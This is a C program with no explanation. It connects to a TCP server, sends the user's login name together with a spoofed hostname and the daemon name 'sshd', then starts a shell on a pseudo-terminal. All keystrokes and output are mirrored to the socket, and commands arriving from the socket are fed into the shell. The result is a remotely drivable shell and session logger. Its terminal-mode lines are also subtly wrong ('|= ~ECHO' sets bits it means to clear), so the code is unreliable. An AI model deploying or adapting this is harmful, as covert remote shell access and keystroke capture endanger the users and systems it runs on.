#define _GNU_SOURCE

#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <error.h>
#include <string.h>
#include <netdb.h>
#include <sys/select.h>
#include <stdlib.h>
#include <fcntl.h>
#include <termios.h>
#include <sys/ioctl.h>

#define SERVER "localhost"
#define PORT 8080
#define HOSTNAME "tacohost"
#define DAEMON "sshd"

#define LOGIN_OFFSET 0
#define LOGIN_LENGTH 16
#define HOSTNAME_OFFSET 16
#define HOSTNAME_LENGTH 16
#define DAEMON_OFFSET 32
#define DAEMON_LENGTH 16

int main(int argc, char ** argv, char ** envp)
{
	int s = socket(AF_INET, SOCK_STREAM, 0);
	if (s < 0) {
		perror("socket");
		return -1;
	}

	struct addrinfo hints;
	memset(&hints, 0, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_flags |= AI_CANONNAME;

	struct addrinfo *ai;
	if (getaddrinfo(SERVER, NULL, &hints, &ai)) {
		perror("getaddrinfo");
		return -1;
	}

	struct sockaddr_in sa;
	memcpy(&sa, ai->ai_addr, ai->ai_addrlen);
	sa.sin_port = htons(PORT);

	if (connect(s, (struct sockaddr *) &sa, sizeof(sa)) < 0) {
		perror("connect");
		return -1;
	}

	char control[128];
	memset(control, 0, 128);

	char * str = getlogin();
	size_t l = strlen(str) < LOGIN_LENGTH ? strlen(str) : LOGIN_LENGTH;
	memcpy(control + LOGIN_OFFSET, str, l);

	str = HOSTNAME;
	l = strlen(str) < HOSTNAME_LENGTH ? strlen(str) : HOSTNAME_LENGTH;
	memcpy(control + HOSTNAME_OFFSET, str, l);

	str = DAEMON;
	l = strlen(str) < DAEMON_LENGTH ? strlen(str) : DAEMON_LENGTH;
	memcpy(control + DAEMON_OFFSET, str, l);

	write(s, control, 128);

	int m = getpt();
	if (m < 0) {
		perror("getpt");
		return -1;
	}

	struct termios t;
	tcgetattr(m, &t);
	t.c_lflag |= ~ECHO;
	t.c_lflag |= ~ICANON;
	tcsetattr(m, TCSANOW, &t);

	if (!fork()) {
		if (grantpt(m)) {
			perror("grantpt");
			return -1;
		}

		if (unlockpt(m)) {
			perror("unlockpt");
			return -1;
		}

		int pts = open(ptsname(m), O_RDWR);

		close(m);
		close(s);
		close(0);
		close(1);
		close(2);

		dup2(pts, 0);
		dup2(pts, 1);
		dup2(pts, 2);

		setsid();
		ioctl(pts, TIOCSCTTY, NULL);

		close(pts);
		char *argv[] = {"sh", NULL};
		if (execve("/bin/sh", argv, envp)) {
			perror("execl");
		}
	}

	char buf[256];
	ssize_t len;
	fd_set fds;
	FD_ZERO(&fds);

	do {
		if (FD_ISSET(0, &fds)) {
			len = read(0, buf, 256);
			if (len > 0) {
				write(m, buf, len);
				write(s, buf, len);
			}
		}

		if (FD_ISSET(m, &fds)) {
			len = read(m, buf, 256);
			if (len > 0) {
				write(1, buf, len);
				write(s, buf, len);
			}
		}

		if (FD_ISSET(s, &fds)) {
			len = read(s, buf, 256);
			if (len > 0) {
				write(m, buf, len);
			}
		}

		FD_ZERO(&fds);
		FD_SET(0, &fds);
		FD_SET(s, &fds);
		FD_SET(m, &fds);
	} while (select(m + 1, &fds, NULL, NULL, NULL) > 0);

	return 0;
}
